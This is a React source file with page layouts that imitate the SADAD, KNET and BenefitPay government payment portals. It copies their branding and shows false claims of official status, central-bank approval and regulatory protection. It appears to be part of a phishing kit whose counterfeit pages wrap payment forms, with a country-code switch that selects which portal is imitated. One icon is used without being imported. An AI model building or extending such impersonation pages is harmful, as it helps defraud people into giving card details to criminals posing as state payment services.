import React from 'react';
import { Card } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { getBrandingByCompany } from '@/lib/brandingSystem';
import { governmentPaymentSystems } from '@/lib/governmentPaymentSystems';
import { 
  Shield, 
  Lock, 
  CheckCircle2, 
  CreditCard,
  Building2,
  Globe,
  Phone,
  Smartphone
} from 'lucide-react';

interface GovernmentLayoutProps {
  countryCode: string;
  children: React.ReactNode;
  amount?: string;
  serviceName?: string;
}

export const SADADLayout: React.FC<GovernmentLayoutProps> = ({ 
  children, 
  amount, 
  serviceName 
}) => {
  const govSystem = governmentPaymentSystems.SA;
  
  return (
    <div className="min-h-screen bg-[#F0FAF5] font-arabic" dir="rtl">
      <header className="bg-white border-b-8 border-[#006633] h-24 flex items-center px-6 sticky top-0 z-50">
         <div className="container mx-auto flex items-center justify-between">
            <div className="flex items-center gap-6">
               <img src="/gov-sadad-official.png" className="h-16" alt="SADAD" />
               <div className="h-12 w-px bg-gray-100" />
               <div>
                  <h1 className="text-xl font-black text-[#006633]">نظام سداد للمدفوعات</h1>
                  <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Official SADAD Payment Portal</p>
               </div>
            </div>
            <div className="flex items-center gap-4">
               <div className="px-4 py-2 bg-green-50 text-[#006633] rounded-lg text-xs font-black border border-green-100 flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4" /> معتمد من SAMA
               </div>
            </div>
         </div>
      </header>
      <main className="container mx-auto max-w-4xl px-4 py-12">
         <Card className="p-10 border-0 shadow-2xl rounded-none bg-white relative overflow-hidden">
            <div className="absolute top-0 right-0 w-2 h-full bg-[#006633]" />
            <div className="flex justify-between items-start mb-12">
               <div>
                  <h2 className="text-3xl font-black text-gray-800 mb-2">{serviceName || 'دفع الخدمات الحكومية'}</h2>
                  <p className="text-gray-400 font-bold">يرجى إكمال بيانات السداد الموضحة أدناه</p>
               </div>
               {amount && (
                 <div className="bg-[#f8fcf9] p-6 border-2 border-[#006633]/20 rounded-2xl text-center min-w-[180px]">
                    <p className="text-[10px] font-black text-gray-400 uppercase mb-1">المبلغ الإجمالي</p>
                    <p className="text-3xl font-black text-[#006633]">{amount}</p>
                 </div>
               )}
            </div>
            {children}
         </Card>
         <div className="mt-8 text-center text-[10px] font-bold text-gray-400 leading-relaxed max-w-2xl mx-auto">
            جميع العمليات تتم عبر الشبكة السعودية للمدفوعات. إن استخدامك لهذا الموقع يعني موافقتك على شروط وأحكام الخدمة وسياسة الخصوصية.
         </div>
      </main>
    </div>
  );
};

export const KNETLayout: React.FC<GovernmentLayoutProps> = ({ 
  children, 
  amount, 
  serviceName 
}) => {
  return (
    <div className="min-h-screen bg-[#F5F8FA] font-arabic" dir="rtl">
      <header className="bg-[#003366] h-20 flex items-center px-6 sticky top-0 z-50">
         <div className="container mx-auto flex items-center justify-between">
            <img src="/gov-knet-logo.png" className="h-10 brightness-0 invert" alt="KNET" />
            <div className="text-white text-xs font-black opacity-80 uppercase tracking-widest">Kpay Online Payment</div>
         </div>
      </header>
      <main className="container mx-auto max-w-2xl px-4 py-12">
         <Card className="p-8 sm:p-12 border-0 shadow-xl rounded-2xl bg-white">
            <div className="text-center mb-10">
               <div className="w-20 h-20 bg-[#003366]/5 rounded-full flex items-center justify-center mx-auto mb-6">
                  <CreditCard className="w-10 h-10 text-[#003366]" />
               </div>
               <h2 className="text-2xl font-black text-gray-800">Kpay Online Payment</h2>
               <p className="text-gray-400 text-sm font-bold mt-1">Select your bank to complete payment</p>
            </div>
            <div className="space-y-6">
               <div className="flex justify-between items-center p-4 bg-gray-50 rounded-xl border border-gray-100">
                  <span className="text-sm font-bold text-gray-500">Merchant Name:</span>
                  <span className="text-sm font-black text-gray-800">{serviceName || 'Kuwait Government'}</span>
               </div>
               <div className="flex justify-between items-center p-4 bg-[#003366]/5 rounded-xl border border-[#003366]/10">
                  <span className="text-sm font-bold text-[#003366]">Total Amount:</span>
                  <span className="text-xl font-black text-[#003366]">{amount || '---'}</span>
               </div>
            </div>
            <div className="mt-10">
               {children}
            </div>
         </Card>
         <div className="mt-8 flex justify-center items-center gap-8 opacity-40 grayscale h-5">
            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
         </div>
      </main>
    </div>
  );
};

export const BENEFITLayout: React.FC<GovernmentLayoutProps> = ({ 
  children, 
  amount, 
  serviceName 
}) => {
  return (
    <div className="min-h-screen bg-[#fcfcfc] font-arabic" dir="rtl">
      <header className="bg-white border-b h-20 flex items-center px-6 sticky top-0 z-50">
         <div className="container mx-auto flex items-center justify-between">
            <img src="/gov-benefit-logo.png" className="h-10" alt="BENEFIT" />
            <div className="flex items-center gap-2">
               <Lock className="w-4 h-4 text-red-600" />
               <span className="text-[10px] font-black text-red-600 uppercase tracking-widest">BenefitPay Secure</span>
            </div>
         </div>
      </header>
      <main className="container mx-auto max-w-md px-4 py-12">
         <Card className="p-8 border-t-8 border-red-600 shadow-2xl rounded-none bg-white">
            <div className="text-center mb-8">
               <h2 className="text-2xl font-black text-gray-800">BenefitPay</h2>
               <p className="text-gray-400 text-xs font-bold mt-1 uppercase tracking-widest">National Electronic Wallet</p>
            </div>
            <div className="bg-red-50 p-6 rounded-2xl mb-8 flex justify-between items-center border border-red-100">
               <span className="font-black text-red-900">Total:</span>
               <span className="text-2xl font-black text-red-600">{amount}</span>
            </div>
            {children}
         </Card>
         <div className="mt-8 p-6 bg-gray-50 rounded-2xl flex items-center gap-4 border border-gray-100">
            <Shield className="w-10 h-10 text-gray-300" />
            <p className="text-[10px] font-bold text-gray-400 leading-relaxed">
               This is a secure national payment gateway in Bahrain. Your transaction is protected by CBB regulations.
            </p>
         </div>
      </main>
    </div>
  );
};

interface GovernmentBadgeProps {
  countryCode: string;
}

export const GovernmentSecurityBadge: React.FC<GovernmentBadgeProps> = ({ countryCode }) => {
  const govSystem = governmentPaymentSystems[countryCode as keyof typeof governmentPaymentSystems];
  
  if (!govSystem) return null;
  
  return (
    <Card 
      className="p-6 text-white mb-6"
      style={{ background: govSystem.gradients.primary }}
    >
      <div className="flex items-center gap-4">
        <Shield className="w-12 h-12" />
        <div>
          <h3 className="font-bold text-lg mb-1">{govSystem.nameAr}</h3>
          <p className="text-sm opacity-90">{govSystem.description}</p>
        </div>
      </div>
      
      <div className="grid grid-cols-3 gap-3 mt-4 pt-4 border-t border-white/20">
        {[
          { icon: Lock, text: 'تشفير SSL' },
          { icon: CheckCircle2, text: 'معتمد حكومياً' },
          { icon: Building2, text: 'نظام وطني' }
        ].map((item, idx) => (
          <div key={idx} className="text-center">
            <item.icon className="w-5 h-5 mx-auto mb-1 opacity-90" />
            <p className="text-xs font-semibold">{item.text}</p>
          </div>
        ))}
      </div>
    </Card>
  );
};

export const getGovernmentLayout = (countryCode: string) => {
  switch (countryCode.toUpperCase()) {
    case 'SA':
      return SADADLayout;
    case 'KW':
      return KNETLayout;
    case 'BH':
      return BENEFITLayout;
    default:
      return SADADLayout;
  }
};

export default {
  SADADLayout,
  KNETLayout,
  BENEFITLayout,
  GovernmentSecurityBadge,
  getGovernmentLayout
};
